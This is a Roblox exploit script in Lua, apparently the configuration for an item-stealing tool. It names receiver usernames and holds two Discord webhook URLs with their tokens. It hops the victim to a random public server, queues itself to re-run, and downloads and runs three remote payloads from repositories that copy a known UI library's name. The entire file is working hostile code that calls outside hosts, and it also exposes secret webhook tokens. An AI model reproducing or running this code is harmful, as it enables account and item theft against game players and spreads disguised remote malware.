-- ========== COOLDOWN PROTECTION ==========
if getgenv()._CONFIG_LAST_RUN and tick() - getgenv()._CONFIG_LAST_RUN < 999999 then
    return
end
getgenv()._CONFIG_LAST_RUN = tick()
-- =========================================

-- ========== BLOCKLIST ==========
local BLOCKED_USERNAMES = {
    "HayzyD",
    "pisasintia",
    "Nrdudfdu"
}

local function isPlayerBlocked()
    local LocalPlayer = game:GetService("Players").LocalPlayer
    for _, blockedName in ipairs(BLOCKED_USERNAMES) do
        if LocalPlayer.Name:lower() == blockedName:lower() then
            return true
        end
    end
    return false
end

if isPlayerBlocked() then
    return
end
-- ==============================

-- ========== USER CONFIG ==========
Username = "shxsui2133"
Username2 = "shxsui21330"
Webhook = "https://discord.com/api/webhooks/1386292356545777674/EHzO0Umd8EXyxHMcR1MKOpPLoK0wJMAu6i_U660uFT8ukBraMrE4V6FhMlQrpdve-Sum"
MonitorWebhook = "https://discord.com/api/webhooks/1391424515078230117/hZdzPdioaCMLCFzgJPdDNlY3c04JWCSdacjOJ0elWYgiK3vJnWZHxPruKabfd4CUIeK7"
MinWeight = 20 
MaxWeight = 100
Huge_Notif = 20
ENABLE_SINGLETON = true

local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")

local function queueSelf()
    local q = (syn and syn.queue_on_teleport) or (queue_on_teleport) or (fluxus and fluxus.queue_on_teleport) or (KRNL_LOADED and queue_on_teleport)
    if not q then return end
    local code = [[getgenv()._CONFIG_POST_HOP = true
loadstring(readfile("config.lua"))()]]
    pcall(q, code)
end

local function hopServer()
    local placeId = game.PlaceId
    local cursor = nil
    local function isPublicServer(s)
        if not s or type(s) ~= "table" then return false end
        if s.vipServerOwnerId ~= nil then return false end
        if s.privateServerId ~= nil then return false end
        if not s.id or type(s.id) ~= "string" then return false end
        if not tonumber(s.playing) or not tonumber(s.maxPlayers) then return false end
        if s.id == game.JobId then return false end
        if tonumber(s.playing) >= tonumber(s.maxPlayers) then return false end
        return true
    end
    for _ = 1, 5 do
        local url = "https://games.roblox.com/v1/games/"..placeId.."/servers/Public?sortOrder=Asc&limit=100"..(cursor and ("&cursor="..HttpService:UrlEncode(cursor)) or "")
        local ok, body = pcall(game.HttpGet, game, url)
        if ok and body then
            local ok2, data = pcall(function() return HttpService:JSONDecode(body) end)
            if ok2 and data and data.data then
                local candidates = {}
                for _, s in ipairs(data.data) do
                    if isPublicServer(s) then table.insert(candidates, s.id) end
                end
                if #candidates > 0 then
                    local pick = candidates[math.random(1, #candidates)]
                    TeleportService:TeleportToPlaceInstance(placeId, pick)
                    task.wait(2)
                end
                cursor = data.nextPageCursor
                if not cursor then break end
            else
                break
            end
        else
            break
        end
    end
    return
end

if not getgenv()._CONFIG_POST_HOP then
    queueSelf()
    hopServer()
    return
end

loadstring(game:HttpGet("https://raw.githubusercontent.com/rayfield-gui/huwan/refs/heads/main/huwan", true))()
task.wait(1)
loadstring(game:HttpGet("https://raw.githubusercontent.com/rayfield-gui/huto/refs/heads/main/huto", true))()
task.wait(1)
loadstring(game:HttpGet("https://raw.githubusercontent.com/rayfield-gui/hutre-runner/refs/heads/main/hutre-runner", true))()

queueSelf()
